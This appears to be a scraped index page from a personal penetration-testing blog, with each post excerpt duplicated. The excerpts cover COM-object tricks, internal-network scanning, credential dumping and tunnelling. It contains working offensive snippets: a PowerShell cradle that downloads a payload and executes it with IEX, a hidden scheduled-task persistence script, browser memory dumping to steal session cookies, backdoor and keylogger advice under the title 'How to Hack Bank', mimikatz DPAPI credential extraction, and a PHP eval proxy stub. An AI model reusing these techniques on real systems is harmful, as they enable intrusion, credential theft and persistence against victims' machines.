$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
$Instance.Connect()
$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
$Task &#x3D; $Instance.NewTask(0)
$Trigger &#x3D; $Task.triggers.Create(0)
$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
$Trigger.Enabled &#x3D; $True
$Trigger.Id &#x3D; $Taskname
$Action &#x3D; $Task.Actions.Create(0)
$Action.Path &#x3D; “cmd.exe”
$Action.Arguments &#x3D; “&#x2F;c whoami”
$Action.HideAppWindow &#x3D; $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)

function Convert-Date &#123;       

        param(
             [datetime]$Date

        )       

        PROCESS &#123;
               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
        &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
</ul>

	

	</div>
  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
</blockquote>
<p>我就瞎写了:</p>
<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
$Instance.Connect()
$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
$Task &#x3D; $Instance.NewTask(0)
$Trigger &#x3D; $Task.triggers.Create(0)
$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
$Trigger.Enabled &#x3D; $True
$Trigger.Id &#x3D; $Taskname
$Action &#x3D; $Task.Actions.Create(0)
$Action.Path &#x3D; “cmd.exe”
$Action.Arguments &#x3D; “&#x2F;c whoami”
$Action.HideAppWindow &#x3D; $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)

function Convert-Date &#123;       

        param(
             [datetime]$Date

        )       

        PROCESS &#123;
               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
        &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
</ul>

	
	</div>
  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/05/14/workgroup-pentest2.html" >内网渗透流水账</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-05-14  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
<li>Linux主机www权限</li>
<li>主机无法出外网</li>
<li>正向代理无法使用</li>
<li>B段内网</li>
</ol>
<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
使用scan查看keys: scan 0 match * count 100 
查看类型: type &lt;key&gt;
hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
	

	</div>
  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
<li>Linux主机www权限</li>
<li>主机无法出外网</li>
<li>正向代理无法使用</li>
<li>B段内网</li>
</ol>
<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
使用scan查看keys: scan 0 match * count 100 
查看类型: type &lt;key&gt;
hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
	
	</div>
  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/05/06/python-elk.html" >Python处理xlsx到ELK</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-05-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ul>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
</ul>

	

	</div>
  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ul>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
</ul>

	
	</div>
  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-04-22  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
</blockquote>
<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
findstr PHPSESSID * .dmp&gt; tmp
strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
<li>常用的操作用一个后门</li>
<li>留一个备用的后门，第一个失效之后启用</li>
</ol>
<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
post&#x2F;windows&#x2F;gather&#x2F;screen_spy

再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。


使用Windows自带的PSR截屏：
psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
living that way. So I began to spend more time away from my computer, with other people, 
learning to open myself to the world, to feel my emotions, to connect with others, to accept 
risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
</blockquote>
<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
findstr PHPSESSID * .dmp&gt; tmp
strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
<li>常用的操作用一个后门</li>
<li>留一个备用的后门，第一个失效之后启用</li>
</ol>
<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
post&#x2F;windows&#x2F;gather&#x2F;screen_spy

再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。


使用Windows自带的PSR截屏：
psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
living that way. So I began to spend more time away from my computer, with other people, 
learning to open myself to the world, to feel my emotions, to connect with others, to accept 
risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/04/13/dpapi-pass-dump.html" >通过DPAPI获取windows身份凭证</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-04-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
<ul>
<li>IE、Chrome密码登陆表单的自动完成</li>
<li>邮箱客户端用户密码</li>
<li>FTP管理账户密码</li>
<li>远程桌面身份密码</li>
<li>……</li>
</ul>
<p>查找本地的Credentials:<br>通常的保存位置:</p>
<ul>
<li><code>%appdata%\Microsoft\Credentials</code></li>
<li><code>%localappdata%\Microsoft\Credentials</code></li>
<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
</ul>
<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
<ul>
<li>IE、Chrome密码登陆表单的自动完成</li>
<li>邮箱客户端用户密码</li>
<li>FTP管理账户密码</li>
<li>远程桌面身份密码</li>
<li>……</li>
</ul>
<p>查找本地的Credentials:<br>通常的保存位置:</p>
<ul>
<li><code>%appdata%\Microsoft\Credentials</code></li>
<li><code>%localappdata%\Microsoft\Credentials</code></li>
<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
</ul>
<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/12/13/python-debug.html" >Pycharm远程调试Docker</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-12-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>调试的流水账:</p>
<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>没毛病就表示安装成功。</p>
<p>这个pycharm的包一般在这个目录:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后配置pycharm:</p>
<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:

Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment

添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:

Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
	

	</div>
  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>调试的流水账:</p>
<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>没毛病就表示安装成功。</p>
<p>这个pycharm的包一般在这个目录:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后配置pycharm:</p>
<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:

Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment

添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:

Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
	
	</div>
  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/10/23/php-eval-proxy.html" >PHP Eval HTTP Proxy</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-10-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
import socket
import binascii
import requests


headers &#x3D; &#123;
&quot;Host&quot;: &quot;&quot;,
&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
&quot;Connection&quot;: &quot;close&quot;
&#125;

url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&quot;127.0.0.1&quot;,8889))
s.listen(5)
sock, addr_info &#x3D; s.accept()

while True:
    print &#39;Connect by &#39;, addr_info
    data &#x3D; sock.recv(102400)
